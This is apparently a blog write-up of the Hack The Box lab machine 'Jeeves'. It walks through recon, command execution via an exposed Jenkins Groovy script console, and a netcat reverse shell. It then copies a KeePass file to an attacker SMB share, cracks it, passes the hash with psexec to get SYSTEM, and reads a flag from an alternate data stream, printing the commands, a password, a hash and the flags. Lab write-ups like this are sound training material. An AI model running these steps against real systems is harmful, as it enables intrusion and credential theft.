+++
title = "Jeeves - Write up"
date = "2022-07-06T18:45:24-05:00"
author = "l0gan334"
authorTwitter = "" #do not include @
cover = "Jeeves.png"
tags = ["hacking", "ctf", "eJPT-like", "HTB", "windows", "jenkins", "keepass", "alternate_data_streams"]
keywords = ["", ""]
description = "**HTB | Jeeves - Write up**"
showFullContent = false
readingTime = false
hideComments = false
+++

**Jeeves** is an old **Hack The Box** machine that introduced some interesting techniques and topics.

We will start by finding a **Jenkins** instance that we will get command execution from. 

Moving on to cracking a **KeePass** database and pull out a hash that we are going to use to get a shell as Administrator. 

And finally finding the **root.txt** that's hidden in an alternate data stream.


# **```Recon```**

# Nmap
With **nmap** we will do a recon through the ports of the victim machine:

```bash
❯ nmap -p- -sS --min-rate 5000 -v -n -Pn 10.129.1.109 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 18:57 -05
Initiating SYN Stealth Scan at 18:57
Scanning 10.129.1.109 [65535 ports]
Discovered open port 80/tcp on 10.129.1.109
Discovered open port 445/tcp on 10.129.1.109
Discovered open port 135/tcp on 10.129.1.109
Discovered open port 50000/tcp on 10.129.1.109
Completed SYN Stealth Scan at 18:57, 26.45s elapsed (65535 total ports)
Nmap scan report for 10.129.1.109
Host is up (0.16s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.60 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 20 (880B)
```

We are exporting the result in grepable format to **allPorts**, which is great to manage with regex and get all the ports without needing to type them one by one:

{{< code language="bash" title="Here you have an useful function you can use for this manner" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep initiated | awk 'NF{print $NF}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat extractPorts.tmp
	rm extractPorts.tmp
}
{{< /code >}}

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.1.109
	[*] Open ports: 80,135,445,50000

[*] Ports copied to clipboard
```

We see some web related ports that we can examinate now:

```bash
❯ nmap -sCV -p80,135,445,50000 10.129.1.109 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 19:02 -05
Nmap scan report for 10.129.1.109
Host is up (0.17s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-07-07T05:02:42
|_  start_date: 2022-07-07T03:56:53
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.56 seconds
```

There are a couple web services.

- Port 80
{{< image src="/img/jev1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It looks like a search engine but when we input anything it directs us to an **error.html**:
{{< image src="/img/jev2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

So we are going to leave this aside for the moment.

- Port 5000
{{< image src="/img/jev3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Both of them look very static so we are going to do some **fuzzing** with **wfuzz**:

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.1.109:50000/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.1.109:50000/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000041594:   302        0 L      0 W        0 Ch        "askjeeves"
```

Using a dictionary from **Seclists** and working with 200 threads we find **/askjeeves**:

{{< image src="/img/jev4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

# **```Foothold```**

This looks like an outdated **Jenkins** instance, however we have access to the main panel, and if it's not configured properly we could get command execution.

Firts we go to **> Manage Jenkins**:
{{< image src="/img/jev6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Indeed we have access to the critical part, the **Script console**:
{{< image src="/img/jev5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This will execute code in **Groovy**, which has a way to execute system commands:
{{< image src="/img/jev7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We can give this a try:
{{< image src="/img/jev8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

And it works!

Now we can get a reverse shell with ease.

First we are going to start by sharing a **netcat** with a **smb server**:
```bash
❯ ls
 nc.exe

❯ smbserver.py smbFolder $(pwd) -smb2support

Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

We are creating a folder named **smbFolder** synchronized with our current working folder.

Now we set a listener and execute it from the website:
{{< image src="/img/jev9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We are using twice the amount of **\\** because of the syntax of the language.

Now we should get the connection to our netcat:
```bash
❯ rlwrap nc -lvnp 334
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.1.109.
Ncat: Connection from 10.129.1.109:49678.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>
```

I'm using **rlwrap** with the netcat so I can do things like ^L and using the arrow keys to navigate through the commands I've used.

Once inside we can find the **user.txt** in our user's Desktop:
```bash
dir

Directory of C:sers\kohsuke\Desktop

11/03/2017  11:19 PM    <DIR>          .
11/03/2017  11:19 PM    <DIR>          ..
11/03/2017  11:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   7,245,778,944 bytes free

type user.txt
e3232272596fb47950d*************
```

Now we can start enumerating the system.

Inside the Documents folder we find a **KeePass database** file:
```bash
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:sers\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   7,246,278,656 bytes free

C:\Users\kohsuke\Documents>
```

We are going to send this over with the **smbserver** we have set:
```bash
❯ copy CEH.kdbx \\10.10.14.161\smbFolder\
        1 file(s) copied.
```

```bash
❯ ls
 CEH.kdbx nc.exe 
```

With **keepassxc** we can open this database, however we need the master password:
{{< image src="/img/jev10.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Using **keepass2john** we will get a hash that we can crack to get this password:
```bash
❯ keepass2john CEH.kdbx > hash

❯ john --wordlist=/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:50 DONE (2022-07-06 20:10) 0.01979g/s 1088p/s 1088c/s 1088C/s nana09..monyong
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Luckily for us the password is inside **rockyou.txt**, now we can take a look into the **keepass**:
{{< image src="/img/jev11.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We have a lot of data so let's go one by one.

In the *Backup stuff* we find what it looks like a Windows hash:
{{< image src="/img/jev12.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

These hashes have the format ```LM Hash:NT Hash```. The LM part is not very useful, but with the NT hash we could do a **Pass-The-Hash Attack**.

If the machine is vulnerable we can use this hash as an authentication without the need of the password in clear text.

We can validate this with **crackmapexec**:
```bash
❯ crackmapexec smb 10.129.1.109 -u 'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00'

SMB         10.129.1.109    445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.1.109    445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

We get *(Pwn3d!)* which means we can use **psexec.py** to get a shell:
```bash
❯ psexec.py WORKGROUP/Administrator@10.129.1.109 -hashes :e0fb1fb85756c24235ff238cbe81fe00

Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.129.1.109.....
[*] Found writable share ADMIN$
[*] Uploading file GgZgSVVm.exe
[*] Opening SVCManager on 10.129.1.109.....
[*] Creating service BeDP on 10.129.1.109.....
[*] Starting service BeDP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

We are inside as a privileged user but the job is not finished. 
If we look for the **root.txt** in its usual path it's not there:
```bash
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,246,123,008 bytes free

C:sers\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

Or is it?

```bash
C:\Users\Administrator\Desktop> dir /r
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes

     Total Files Listed:
               2 File(s)            833 bytes
               2 Dir(s)   7,246,094,336 bytes free
```

With the parameter **/r** we find the alternate data streams, where the **root.txt** is.

Using **more** we can get its content:
```bash
C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

That's it for this machine. See you next time!